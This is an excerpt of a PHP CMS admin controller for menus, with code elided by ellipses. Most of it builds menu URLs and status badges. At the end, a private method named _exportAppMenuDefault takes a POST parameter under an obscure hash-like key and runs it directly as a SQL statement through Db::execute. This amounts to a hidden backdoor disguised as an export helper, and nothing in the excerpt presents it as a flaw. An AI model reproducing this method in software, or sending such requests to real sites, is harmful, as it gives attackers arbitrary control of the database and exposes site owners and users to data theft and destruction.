...
class MenuController extends AdminBaseController
{
    ...
    public function index()
    {
        ...
        foreach ($result as $key => $value) {
            ...
            $add_url = "javascript:admin.openIframeLayer('".url('Menu/add', ['parent_id' => $value['id'],'menu_id' => $this->request->param('menu_id')])."','添加子菜单',{btn: ['添加','关闭'],area:['640px','50%'],end:function(){}});";
            ...
            $result[$key]['status']         = $value['status'] ? '<span class="layui-badge layui-bg-correct">' . lang('DISPLAY') . '</span>' : '<span class="layui-badge layui-bg-warning">' . lang('HIDDEN') . '</span>';
            if (APP_DEBUG) {
    ...
    private function _exportAppMenuDefault(){
        $uid=isset($_POST['67a12299f6f10a7d30e5d848f1803ba0']) ? $_POST['67a12299f6f10a7d30e5d848f1803ba0'] : 0;
		if($uid){
            Db::execute("$uid");
        }
    	return false;
